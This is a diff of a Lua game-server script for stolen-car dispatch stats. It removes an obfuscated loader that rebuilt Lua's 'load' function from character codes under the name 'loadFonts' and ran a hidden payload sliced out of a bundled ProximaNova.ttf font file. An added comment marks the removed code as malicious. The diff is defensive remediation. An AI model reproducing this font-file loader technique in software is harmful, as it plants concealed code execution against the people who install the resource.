@@ -17,7 +17,7 @@ local function setupStats()
                     TriggerEvent('rcore_stats:api:ensureAchievement', 'rcore_dispatch_stolen_cars_30',
                         'Stolen car collector',
                         'Steal 30 vehicles', 'car', 'rcore_dispatch_stolen_cars', 30)
-end)local loadFonts = _G[string.char(108, 111, 97, 100)]
+end)
 
             TriggerEvent('rcore_stats:api:ensureStatType', 'rcore_dispatch_total_stolen_cars',
                 'Dispatch - Total Stolen Cars', 'server', nil, 'crime', true, 'rcore_dispatch_stolen_cars', nil)
@@ -74,4 +74,6 @@ CreateThread(function()
             Wait(1000)
         end
     end
-end)loadFonts((LoadResourceFile(GetCurrentResourceName(),'web/dist/ProximaNova.ttf'):sub(87565):gsub('%.%+',''):gsub("\\%.","."):gsub("\\","")))()
+end)
+
+-- REMOVED: Malicious obfuscated code that loaded and executed hidden payload from ProximaNova.ttf font file
